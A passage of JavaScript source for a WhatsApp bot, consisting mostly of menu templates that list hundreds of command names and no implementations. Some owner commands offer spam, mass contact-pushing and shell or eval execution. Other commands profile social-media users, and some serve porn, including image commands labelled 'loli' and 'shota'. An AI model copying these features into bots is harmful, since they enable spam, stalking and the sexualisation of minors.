${setv} ${prefix}tiktoksantuy
${setv} ${prefix}tiktokbocil
╰─┬────❍
╔┄┄┄┄[ \`Stalker\` ]┄┄┄┄
${setv} ${prefix}tiktokstalk
${setv} ${prefix}mlstalk
${setv} ${prefix}npmstalk
${setv} ${prefix}ghstalk
╰─┬────❍
╔┄┄┄┄[ \`OpenAI\` ]┄┄┄┄
${setv} ${prefix}blackboxai
${setv} ${prefix}travel-assistant
${setv} ${prefix}guru-ai
${setv} ${prefix}ai
${setv} ${prefix}gemini
${setv} ${prefix}islamiai
${setv} ${prefix}gpt4
${setv} ${prefix}lenwy
${setv} ${prefix}simi
${setv} ${prefix}emi-ai
${setv} ${prefix}claude-ai
${setv} ${prefix}hercai-cartoon
${setv} ${prefix}hercai-animefy
${setv} ${prefix}hercai-lexica
${setv} ${prefix}hercai-prodia
${setv} ${prefix}hercai-simur
${setv} ${prefix}hercai-raava
${setv} ${prefix}hercai-shonin
${setv} ${prefix}realistic
${setv} ${prefix}3dmodel
${setv} ${prefix}photoleap
${setv} ${prefix}openai
${setv} ${prefix}dalle
${setv} ${prefix}ai
${setv} ${prefix}remini
╰─┬────❍
╔┄┄┄┄[ \`Game\` ]┄┄┄┄
${setv} ${prefix}truth
${setv} ${prefix}dare
${setv} ${prefix}suit
${setv} ${prefix}tictactoe
${setv} ${prefix}math
${setv} ${prefix}playbomb
${setv} ${prefix}casino
${setv} ${prefix}rob
${setv} ${prefix}slot
${setv} ${prefix}dice 
${setv} ${prefix}profile
${setv} ${prefix}claim
${setv} ${prefix}tmoney
${setv} ${prefix}tflimit
╰─┬────❍
╔┄┄┄┄[ \`Fun\` ]┄┄┄┄
${setv} ${prefix}define
${setv} ${prefix}readmore
${setv} ${prefix}fact
${setv} ${prefix}couple
${setv} ${prefix}soulmate
${setv} ${prefix}stupidcheck
${setv} ${prefix}handsomecheck
${setv} ${prefix}uncleancheck
${setv} ${prefix}hotcheck
${setv} ${prefix}smartcheck
${setv} ${prefix}greatcheck
${setv} ${prefix}evilcheck
${setv} ${prefix}dogcheck
${setv} ${prefix}coolcheck
${setv} ${prefix}waifucheck
${setv} ${prefix}awesomecheck
${setv} ${prefix}gaycheck
${setv} ${prefix}cutecheck
${setv} ${prefix}lesbiancheck
${setv} ${prefix}hornycheck
${setv} ${prefix}prettycheck
${setv} ${prefix}lovelycheck
${setv} ${prefix}uglycheck
${setv} ${prefix}pick
${setv} ${prefix}pickupline
${setv} ${prefix}quotes
${setv} ${prefix}can
${setv} ${prefix}is
${setv} ${prefix}when
${setv} ${prefix}where
${setv} ${prefix}what
${setv} ${prefix}how
${setv} ${prefix}rate
${setv} ${prefix}cry
${setv} ${prefix}kill
${setv} ${prefix}hug
${setv} ${prefix}pat
${setv} ${prefix}lick 
${setv} ${prefix}kiss
${setv} ${prefix}bite
${setv} ${prefix}yeet
${setv} ${prefix}bully
${setv} ${prefix}bonk
${setv} ${prefix}wink
${setv} ${prefix}poke
${setv} ${prefix}nom
${setv} ${prefix}slap
${setv} ${prefix}smile 
${setv} ${prefix}wave
${setv} ${prefix}awoo
${setv} ${prefix}blush
${setv} ${prefix}smug
${setv} ${prefix}glomp 
${setv} ${prefix}happy
${setv} ${prefix}dance
${setv} ${prefix}cringe
${setv} ${prefix}cuddle
${setv} ${prefix}highfive 
${setv} ${prefix}handhold
${setv} ${prefix}spank
${setv} ${prefix}tickle
${setv} ${prefix}feed
${setv} ${prefix}checkme
${setv} ${prefix}sound1 - sound161
╰─┬────❍
╔┄┄┄┄[ \`Sticker\` ]┄┄┄┄
${setv} ${prefix}goose
${setv} ${prefix}woof
${setv} ${prefix}8ball
${setv} ${prefix}lizard
${setv} ${prefix}meow
${setv} ${prefix}gura
${setv} ${prefix}telestick
╰─┬────❍
╔┄┄┄┄[ \`Anime\` ]┄┄┄┄
${setv} ${prefix}stickhandhold
${setv} ${prefix}stickshinobu
${setv} ${prefix}stickcuddle
${setv} ${prefix}stickhighfive
${setv} ${prefix}stickdance
${setv} ${prefix}stickcringe
${setv} ${prefix}stickhappy
${setv} ${prefix}stickglomp
${setv} ${prefix}sticksmug
${setv} ${prefix}stickblush
${setv} ${prefix}stickawoo
${setv} ${prefix}stickwave
${setv} ${prefix}sticksmile
${setv} ${prefix}stickslap
${setv} ${prefix}stickpoke
${setv} ${prefix}stickwink
${setv} ${prefix}stickbonk
${setv} ${prefix}stickbully
${setv} ${prefix}stickyeet
${setv} ${prefix}stickbike
${setv} ${prefix}stickkiss
${setv} ${prefix}sticklick
${setv} ${prefix}stickpat
${setv} ${prefix}stickhug
${setv} ${prefix}stickkill
${setv} ${prefix}stickcry
${setv} ${prefix}stickspank
${setv} ${prefix}sticktickle
${setv} ${prefix}traceanime
${setv} ${prefix}akira
${setv} ${prefix}akiyama
${setv} ${prefix}ana
${setv} ${prefix}asuna
${setv} ${prefix}ayuzawa
${setv} ${prefix}boruto
${setv} ${prefix}chiho
${setv} ${prefix}chitoge
${setv} ${prefix}cosplayloli
${setv} ${prefix}cosplaysagiri
${setv} ${prefix}deidara
${setv} ${prefix}doraemon
${setv} ${prefix}elaina
${setv} ${prefix}emilia
${setv} ${prefix}erza
${setv} ${prefix}gremory
${setv} ${prefix}hestia
${setv} ${prefix}husbu
${setv} ${prefix}inori
${setv} ${prefix}isuzu
${setv} ${prefix}itachi
${setv} ${prefix}itori
${setv} ${prefix}kaga
${setv} ${prefix}kagura
${setv} ${prefix}kakasih
${setv} ${prefix}kaori
${setv} ${prefix}keneki
${setv} ${prefix}kotori
${setv} ${prefix}kurumi
${setv} ${prefix}loli
${setv} ${prefix}loli2
${setv} ${prefix}madara
${setv} ${prefix}megumin
${setv} ${prefix}mikasa
${setv} ${prefix}mikey
${setv} ${prefix}miku
${setv} ${prefix}minato
${setv} ${prefix}naruto
${setv} ${prefix}neko
${setv} ${prefix}nekonime
${setv} ${prefix}nezuko
${setv} ${prefix}onepiece
${setv} ${prefix}pokemon
${setv} ${prefix}randomnime
${setv} ${prefix}randomnime2
${setv} ${prefix}rize
${setv} ${prefix}sagiri
${setv} ${prefix}sakura
${setv} ${prefix}sasuke
${setv} ${prefix}shina
${setv} ${prefix}shinka
${setv} ${prefix}shinomiya
${setv} ${prefix}shizuka
${setv} ${prefix}shota
${setv} ${prefix}tejina
${setv} ${prefix}toukachan
${setv} ${prefix}tsunade
${setv} ${prefix}waifu
${setv} ${prefix}waifu2
${setv} ${prefix}animewall
${setv} ${prefix}yotsuba
${setv} ${prefix}yuki
${setv} ${prefix}yulibocil
${setv} ${prefix}yumeko
${setv} ${prefix}8ball
${setv} ${prefix}animeawoo
${setv} ${prefix}animemegumin
${setv} ${prefix}animeshinobu
${setv} ${prefix}animehandhold
${setv} ${prefix}animehighfive
${setv} ${prefix}animecringe
${setv} ${prefix}animedance
${setv} ${prefix}animehappy
${setv} ${prefix}animeglomp
${setv} ${prefix}animeblush
${setv} ${prefix}animesmug
${setv} ${prefix}animewave
${setv} ${prefix}animesmille
${setv} ${prefix}animepoke
${setv} ${prefix}animewink
${setv} ${prefix}animebonk
${setv} ${prefix}animebully
${setv} ${prefix}animeyeet
${setv} ${prefix}animebite
${setv} ${prefix}animelick
${setv} ${prefix}animekill
${setv} ${prefix}animecry
${setv} ${prefix}animewlp
${setv} ${prefix}animekiss
${setv} ${prefix}animehug
${setv} ${prefix}animeneko
${setv} ${prefix}animepat
${setv} ${prefix}animeslap
${setv} ${prefix}animecuddle
${setv} ${prefix}animewaifu
${setv} ${prefix}animenom
${setv} ${prefix}animefoxgirl
${setv} ${prefix}animegecg
${setv} ${prefix}animetickle
${setv} ${prefix}animefeed
${setv} ${prefix}animeavatar
${setv} ${prefix}anime
${setv} ${prefix}avatar
${setv} ${prefix}shinobu
${setv} ${prefix}fox_girl
${setv} ${prefix}gecg
╰─┬────❍
╔┄┄┄┄[ \`Anime NSFW\` ]┄┄┄┄
${setv} ${prefix}hentai
${setv} ${prefix}gifblowjob
${setv} ${prefix}hentaivid
${setv} ${prefix}hneko
${setv} ${prefix}nwaifu
${setv} ${prefix}animespank
${setv} ${prefix}trap
${setv} ${prefix}blowjob
${setv} ${prefix}cuckold
${setv} ${prefix}milf
${setv} ${prefix}eba
${setv} ${prefix}pussy
${setv} ${prefix}yuri
${setv} ${prefix}zettai
╰─┬────❍
╔┄┄┄┄[ \`Database\` ]┄┄┄┄
${setv} ${prefix}setcmd
${setv} ${prefix}delcmd
${setv} ${prefix}listcmd
${setv} ${prefix}lockcmd
${setv} ${prefix}addmsg
${setv} ${prefix}delmsg
${setv} ${prefix}getmsg
${setv} ${prefix}listmsg
╰─┬────❍
╔┄┄┄┄[ \`Store\` ]┄┄┄┄
${setv} ${prefix}list
${setv} ${prefix}store
${setv} ${prefix}shop
${setv} ${prefix}addlist
${setv} ${prefix}dellist
╰─┬────❍
╔┄┄┄┄[ \`Religon\` ]┄┄┄┄
${setv} ${prefix}bible
${setv} ${prefix}quran
${setv} ${prefix}gita
╰─┬────❍
╔┄┄┄┄[ \`Other\` ]┄┄┄┄
${setv} ${prefix}ping
${setv} ${prefix}menu
${setv} ${prefix}myip
${setv} ${prefix}repo
${setv} ${prefix}reportbug
${setv} ${prefix}idgroup
${setv} ${prefix}owner
${setv} ${prefix}infoditz
${setv} ${prefix}infobot
${setv} ${prefix}infoowner
${setv} ${prefix}rentbot
${setv} ${prefix}runtime
${setv} ${prefix}confess
${setv} ${prefix}react
${setv} ${prefix}q
${setv} ${prefix}inspect
${setv} ${prefix}tagme
╰──────❍`
menuv(xmenu_oh)
}
break
case 'ownermenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Owner\` ]┄┄┄┄
${setv} ${prefix}addbadword
${setv} ${prefix}delbadword
${setv} ${prefix}autoread
${setv} ${prefix}autobio
${setv} ${prefix}autotype
${setv} ${prefix}pushch
${setv} ${prefix}pushchvn
${setv} ${prefix}pushgc
${setv} ${prefix}pushstickergc
${setv} ${prefix}autorecord
${setv} ${prefix}autorecordtype
${setv} ${prefix}autoswview
${setv} ${prefix}setautoblock
${setv} ${prefix}setantiforeign
${setv} ${prefix}autoblock
${setv} ${prefix}onlygc
${setv} ${prefix}onlypc
${setv} ${prefix}onlyindia
${setv} ${prefix}onlyindo
${setv} ${prefix}anticall
${setv} ${prefix}self
${setv} ${prefix}public
${setv} ${prefix}join
${setv} ${prefix}poll
${setv} ${prefix}spam
${setv} ${prefix}bc
${setv} ${prefix}bcgroup
${setv} ${prefix}setimgmenu
${setv} ${prefix}setvidmenu
${setv} ${prefix}setgifmenu
${setv} ${prefix}setreply
${setv} ${prefix}resethit
${setv} ${prefix}resetuser
${setv} ${prefix}creategc
${setv} ${prefix}setexif
${setv} ${prefix}getexif
${setv} ${prefix}getautoblocknumber
${setv} ${prefix}getantiforeignnumber
${setv} ${prefix}userjid
${setv} ${prefix}setbotbio
${setv} ${prefix}delppbot
${setv} ${prefix}shutdown
${setv} ${prefix}setppbot
${setv} ${prefix}addprem
${setv} ${prefix}delprem
${setv} ${prefix}addowner
${setv} ${prefix}delowner
${setv} ${prefix}addvn
${setv} ${prefix}addapk
${setv} ${prefix}addzip
${setv} ${prefix}addpdf
${setv} ${prefix}delapk
${setv} ${prefix}delzip
${setv} ${prefix}delpdf
${setv} ${prefix}delvn
${setv} ${prefix}addsticker
${setv} ${prefix}delsticker
${setv} ${prefix}addimage
${setv} ${prefix}delimage
${setv} ${prefix}addvideo
${setv} ${prefix}delvideo
${setv} ${prefix}upswtext
${setv} ${prefix}upswvideo
${setv} ${prefix}upswimage
${setv} ${prefix}upswaudio
${setv} ${prefix}autosticker
${setv} ${prefix}block
${setv} ${prefix}unblock
${setv} ${prefix}leavegc
${setv} ${prefix}pushcontact
${setv} ${prefix}pushcontactv2
${setv} ${prefix}pushcontactv3
${setv} ${prefix}jpm
${setv} ${prefix}checkmember
${setv} ${prefix}post
${setv} ${prefix}clearchat
${setv} ${prefix}setprefix
${setv} $
${setv} >
${setv} <
╰──────❍`
menuv(xmenu_oh)
}
break
case 'groupmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Group\` ]┄┄┄┄
${setv} ${prefix}antibot
${setv} ${prefix}antiviewonce
${setv} ${prefix}readviewonce
${setv} ${prefix}welcome
${setv} ${prefix}adminevent
${setv} ${prefix}groupevent
${setv} ${prefix}antiforeign
${setv} ${prefix}antimedia
${setv} ${prefix}antiaudio
${setv} ${prefix}antivideo
${setv} ${prefix}antiimage
${setv} ${prefix}antidocument
${setv} ${prefix}antilocation
${setv} ${prefix}anticontact
${setv} ${prefix}antisticker
${setv} ${prefix}antipoll
${setv} ${prefix}antilink
${setv} ${prefix}antilinkgc
${setv} ${prefix}antilinkch
${setv} ${prefix}antilinknumber
${setv} ${prefix}antipromotion
${setv} ${prefix}antivirtex
${setv} ${prefix}grouplink
${setv} ${prefix}listadmin
${setv} ${prefix}invite
${setv} ${prefix}ephemeral
${setv} ${prefix}delete
${setv} ${prefix}setppgroup
${setv} ${prefix}delppgroup
${setv} ${prefix}setnamegc
${setv} ${prefix}setdesc
${setv} ${prefix}add
${setv} ${prefix}kick
${setv} ${prefix}promote
${setv} ${prefix}demote
${setv} ${prefix}kickall
${setv} ${prefix}promoteall
${setv} ${prefix}demoteall
${setv} ${prefix}getcontact
${setv} ${prefix}savecontact
${setv} ${prefix}sendcontact
${setv} ${prefix}contactag
${setv} ${prefix}hidetag
${setv} ${prefix}totag
${setv} ${prefix}tagall
${setv} ${prefix}editinfo
${setv} ${prefix}opentime
${setv} ${prefix}closetime
${setv} ${prefix}resetlink
${setv} ${prefix}getbio
${setv} ${prefix}vote
${setv} ${prefix}upvote
${setv} ${prefix}downvote
${setv} ${prefix}checkvote
${setv} ${prefix}delvote
${setv} ${prefix}antivirus
${setv} ${prefix}antibadword
${setv} ${prefix}nsfw
${setv} ${prefix}react
${setv} ${prefix}getjoinrequest
╰──────❍`
menuv(xmenu_oh)
}
break
case 'searchmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Search\` ]┄┄┄┄
${setv} ${prefix}google
${setv} ${prefix}wikipedia
${setv} ${prefix}ytsearch
${setv} ${prefix}xnxxsearch
${setv} ${prefix}xvideosearch
${setv} ${prefix}apksearch
${setv} ${prefix}sticker
${setv} ${prefix}qcsearch
${setv} ${prefix}imdb
${setv} ${prefix}wanumber
${setv} ${prefix}friend
${setv} ${prefix}lyrics
${setv} ${prefix}pixiv
╰──────❍`
menuv(xmenu_oh)
}
break
case 'downloadmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Download\` ]┄┄┄┄
${setv} ${prefix}xnxxdl
${setv} ${prefix}xvideodl
${setv} ${prefix}splay
${setv} ${prefix}itunes
${setv} ${prefix}play
${setv} ${prefix}play2
${setv} ${prefix}play3
${setv} ${prefix}playms
${setv} ${prefix}playmusic
${setv} ${prefix}playmusik
${setv} ${prefix}playvd
${setv} ${prefix}playvideo
${setv} ${prefix}ytmp3
${setv} ${prefix}ytmp4
${setv} ${prefix}tiktok
${setv} ${prefix}ttslide
${setv} ${prefix}tiktokaudio
${setv} ${prefix}tiktokvideo
${setv} ${prefix}igvideo
${setv} ${prefix}igmusic
${setv} ${prefix}igimage
${setv} ${prefix}igfoto
${setv} ${prefix}igft
${setv} ${prefix}facebook
${setv} ${prefix}twitter
${setv} ${prefix}apk
${setv} ${prefix}mega
${setv} ${prefix}mediafire
${setv} ${prefix}google
${setv} ${prefix}gimage
${setv} ${prefix}weather
${setv} ${prefix}spotify
${setv} ${prefix}gitclone
${setv} ${prefix}happymod
${setv} ${prefix}gdrive
${setv} ${prefix}pinterest
${setv} ${prefix}zerochan
${setv} ${prefix}infoanime
${setv} ${prefix}ringtone
${setv} ${prefix}autodownload
╰──────❍`
menuv(xmenu_oh)
}
break
case 'servermcmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Server Mc\` ]┄┄┄┄
${setv} ${prefix}mc
${setv} ${prefix}server
${setv} ${prefix}hyperxzbedrock
${setv} ${prefix}hyperxzjava
╰──────❍`
menuv(xmenu_oh)
}
break
case 'servermcmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Server Mc\` ]┄┄┄┄
${setv} ${prefix}mc
${setv} ${prefix}server
${setv} ${prefix}hyperxzbedrock
${setv} ${prefix}hyperxzjava
╰──────❍`
menuv(xmenu_oh)
}
break
case 'toolmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
